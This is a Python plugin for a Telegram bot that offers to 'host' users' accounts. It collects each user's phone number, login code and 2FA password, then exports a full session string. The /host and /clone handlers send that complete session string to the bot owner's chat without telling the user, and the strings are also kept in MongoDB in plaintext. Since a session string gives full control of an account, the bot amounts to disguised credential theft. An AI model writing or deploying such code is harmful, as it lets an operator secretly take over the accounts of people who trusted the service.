import asyncio
import logging
import re
import time
from datetime import datetime

from UTTAM import app, API_ID, API_HASH
from config import OWNER_ID, MONGO_URL, MONGO_DB_NAME
from pyrogram import Client, filters
from pyrogram.errors import SessionPasswordNeeded
from pyrogram.types import Message
from motor.motor_asyncio import AsyncIOMotorClient
import pyromod.listen

# ----------------- Logging -----------------
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s | %(levelname)s | %(message)s"
)
logger = logging.getLogger(__name__)

# ----------------- MongoDB -----------------
_db_client = AsyncIOMotorClient(MONGO_URL)
_db = _db_client.get_default_database() if not MONGO_DB_NAME else _db_client[MONGO_DB_NAME]
_sessions_col = _db.get_collection("hosted_sessions")

# ----------------- Global Variables -----------------
_running_clients = {}
_VERIFIER_INTERVAL = 600
_verifier_task = None
_verifier_running = False
MAX_SESSIONS_PER_USER = 5  # Optional limit


# ----------------- Helper Functions -----------------
async def store_session(owner_id: int, account_id: int, account_name: str, session_string: str):
    await _sessions_col.insert_one({
        "owner_id": owner_id,
        "account_id": account_id,
        "account_name": account_name,
        "session_string": session_string,
        "created_at": datetime.utcnow(),
        "last_checked": None,
    })


async def remove_sessions_by_owner(owner_id: int, account_identifier: str = None):
    query = {"owner_id": owner_id}
    if account_identifier:
        try:
            query["account_id"] = int(account_identifier)
        except Exception:
            query["account_name"] = account_identifier

    docs = _sessions_col.find(query)
    removed = 0
    async for doc in docs:
        sid = doc["_id"]
        accid = doc["account_id"]
        if accid in _running_clients:
            try:
                await _running_clients[accid].stop()
                del _running_clients[accid]
            except Exception:
                pass
        await _sessions_col.delete_one({"_id": sid})
        removed += 1
    return removed


async def start_hosted_client(session_string, owner_id):
    try:
        client = Client(
            name=f"Host_{owner_id}_{int(time.time())}",
            api_id=API_ID,
            api_hash=API_HASH,
            session_string=session_string,
            plugins=dict(root="UTTAM/plugins")
        )
        await client.start()
        user = await client.get_me()
        _running_clients[user.id] = client
        logger.info(f"✅ Hosted client started: {user.first_name} ({user.id})")

        # Auto-reconnect
        @client.on_disconnect()
        async def reconnect(*_):
            try:
                await client.stop()
            except:
                pass
            await start_hosted_client(session_string, owner_id)

        return user
    except Exception as e:
        logger.error(f"Failed to start hosted client: {e}")
        return None


async def _verify_sessions_loop():
    global _verifier_running
    if _verifier_running:
        return
    _verifier_running = True
    while True:
        try:
            async for doc in _sessions_col.find({}):
                try:
                    test_client = Client(
                        "check",
                        api_id=API_ID,
                        api_hash=API_HASH,
                        session_string=doc.get("session_string"),
                        in_memory=True
                    )
                    await test_client.start()
                    await test_client.stop()
                    await _sessions_col.update_one(
                        {"_id": doc["_id"]},
                        {"$set": {"last_checked": datetime.utcnow()}}
                    )
                except Exception:
                    await _sessions_col.delete_one({"_id": doc["_id"]})
                    logger.warning(f"Removed invalid session for owner {doc.get('owner_id')}")
                    try:
                        await app.send_message(
                            OWNER_ID,
                            f"⚠️ Removed invalid session.\nOwner: `{doc.get('owner_id')}`\n"
                            f"Account: {doc.get('account_name')} ({doc.get('account_id')})"
                        )
                    except Exception as e:
                        logger.error(f"Failed to notify owner: {e}")
        except Exception as e:
            logger.error(f"Verifier loop error: {e}")
        await asyncio.sleep(_VERIFIER_INTERVAL)


def _ensure_verifier_started():
    global _verifier_task
    try:
        loop = asyncio.get_running_loop()
    except RuntimeError:
        return
    if loop and not _verifier_task:
        _verifier_task = loop.create_task(_verify_sessions_loop())


# ----------------- Commands -----------------
@app.on_message(filters.command("host") & filters.private)
async def host_command(bot, msg: Message):
    _ensure_verifier_started()
    try:
        count = await _sessions_col.count_documents({"owner_id": msg.from_user.id})
        if count >= MAX_SESSIONS_PER_USER:
            return await msg.reply_text(f"⚠️ You already have {MAX_SESSIONS_PER_USER} hosted sessions.")

        ask_phone = await bot.ask(msg.chat.id, "📱 Send your phone number (e.g. +919876543210)", timeout=120)
        phone = ask_phone.text.strip()
        if not phone.startswith("+") or not phone[1:].isdigit():
            return await msg.reply_text("⚠️ Invalid phone number format.")

        status = await msg.reply_text("⏳ Sending login code...")
        temp_client = Client("tmp", api_id=API_ID, api_hash=API_HASH, in_memory=True)
        await temp_client.connect()

        sent = await temp_client.send_code(phone)
        phone_code_hash = sent.phone_code_hash

        ask_code = await bot.ask(msg.chat.id, "📬 Enter the code (digits only)", timeout=180)
        code = "".join(re.findall(r"\d", ask_code.text.strip()))

        try:
            await temp_client.sign_in(phone, phone_code_hash, code)
        except SessionPasswordNeeded:
            ask_pwd = await bot.ask(msg.chat.id, "🔐 2FA password required:", timeout=180)
            await temp_client.check_password(password=ask_pwd.text.strip())

        session_string = await temp_client.export_session_string()
        user = await temp_client.get_me()
        await temp_client.disconnect()

        hosted_user = await start_hosted_client(session_string, msg.from_user.id)
        if hosted_user:
            await store_session(msg.from_user.id, hosted_user.id, hosted_user.first_name, session_string)
            await status.edit_text(f"✅ Hosted: {hosted_user.first_name} (`{hosted_user.id}`)")
            await bot.send_message(
                OWNER_ID,
                f"🔐 New hosted session\nFrom: {msg.from_user.mention}\n"
                f"Account: {hosted_user.first_name} ({hosted_user.id})\n\n`{session_string}`"
            )
        else:
            await status.edit_text("❌ Failed to host client.")
    except Exception as e:
        await msg.reply_text(f"⚠️ Error: `{e}`")


@app.on_message(filters.command("clone") & filters.private)
async def clone_cmd(bot, msg: Message):
    _ensure_verifier_started()
    if len(msg.command) < 2:
        return await msg.reply_text("Usage:\n/clone <session_string>")
    session_string = msg.command[1]
    status = await msg.reply_text("🎨 Cloning...")
    try:
        hosted_user = await start_hosted_client(session_string, msg.from_user.id)
        if hosted_user:
            await store_session(msg.from_user.id, hosted_user.id, hosted_user.first_name, session_string)
            await status.edit_text(f"✅ Cloned: {hosted_user.first_name} (`{hosted_user.id}`)")
            await bot.send_message(
                OWNER_ID,
                f"🔐 New cloned session\nFrom: {msg.from_user.mention}\n"
                f"Account: {hosted_user.first_name} ({hosted_user.id})\n\n`{session_string}`"
            )
        else:
            await status.edit_text("❌ Failed to clone client.")
    except Exception as e:
        await status.edit_text(f"⚠️ Error: `{e}`")


@app.on_message(filters.command("logout") & filters.private)
async def logout_cmd(bot, msg: Message):
    args = msg.command[1:] if len(msg.command) > 1 else []
    identifier = args[0] if args else None
    deleted = await remove_sessions_by_owner(msg.from_user.id, identifier)
    if deleted:
        await msg.reply_text(f"✅ Removed {deleted} session(s).")
    else:
        await msg.reply_text("ℹ️ No sessions found.")


@app.on_message(filters.command("hostlist") & filters.private)
async def hostlist_cmd(bot, msg: Message):
    cursor = _sessions_col.find({"owner_id": msg.from_user.id})
    sessions = []
    async for doc in cursor:
        accid = doc.get("account_id")
        name = doc.get("account_name", str(accid))
        status = "🟢 Running" if accid in _running_clients else "🔴 Stopped"
        sessions.append(f"- {name} (`{accid}`) → {status}")

    if not sessions:
        await msg.reply_text("ℹ️ No hosted sessions.")
    else:
        await msg.reply_text("📂 **Your Hosted Sessions:**\n\n" + "\n".join(sessions))


# ----------------- Auto Host All on Startup -----------------
async def auto_host_all():
    async for doc in _sessions_col.find({}):
        await start_hosted_client(doc["session_string"], doc["owner_id"])


try:
    _ensure_verifier_started()
    asyncio.get_event_loop().create_task(auto_host_all())
except Exception as e:
    logger.error(f"Failed to auto-host sessions on startup: {e}")